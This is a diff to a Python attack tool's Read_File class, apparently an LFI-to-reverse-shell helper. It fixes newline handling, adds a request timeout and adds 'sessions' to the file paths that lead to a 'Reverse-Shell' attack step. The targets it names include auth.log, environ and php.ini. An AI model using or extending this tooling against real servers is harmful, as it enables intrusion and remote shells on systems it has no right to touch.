@@ -18,13 +18,13 @@ class Read_File:
             if self.args.readuser or self.args.config:
                 try: 
                     with open(self .args.readuser,'r') as username:
-                        self.args.user = username.read().replace('/n','')  
+                        self.args.user = username.read().replace('\n','')  
                 except TypeError:
                     pass         
             if self.args.readpass or self.args.config:
                 try:
                     with open(self.args.readpass,'r') as password:
-                       self.args.password = password.read().replace('/n','')
+                       self.args.password = password.read().replace('\n','')
                 except TypeError:
                     pass       
             if self.args.read or self.args.config :
@@ -94,7 +94,7 @@ class Read_File:
                                  ('password',f'{self.args.password}'),
                                  ('Cookie',str(self.Cookie).replace('\n',''))]
                try:                  
-                  url_login = request.open(loginurl)
+                  url_login = request.open(loginurl,timeout=5)
                except urllib.error.URLError as e :
                    print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                    print("[*] Error : ",e )
@@ -131,7 +131,7 @@ class Read_File:
                    request[f'{self.args.UserForm}'] = f'{self.args.user}'
                    request["password"] = f'{self.args.password}'
                elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
-                   request["username"] = '{self.args.user}'
+                   request["username"] = f'{self.args.user}'
                    request[f'{self.args.PassForm}']=f'{self.args.password}' 
                elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                    request[f'{self.args.UserForm}'] = f'{self.args.user}'
@@ -231,7 +231,7 @@ class Read_File:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
                                 or "environ" in self.url or "environ" in self.url \
                                 or "/apache2/php.ini" in self.url \
-                                or  "fpm/php.ini" in self.url:  
+                                or  "fpm/php.ini" in self.url or 'sessions' in self.url:  
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
@@ -286,7 +286,7 @@ class Read_File:
                            if self.args.shell :
                                 if  "auth" in  self.url or "auth.log" in  self.url\
                                 or "environ" in self.url or "/apache2/php.ini" in self.url \
-                                or  "fpm/php.ini" in self.url: 
+                                or  "fpm/php.ini" in self.url or 'sessions' in self.url: 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
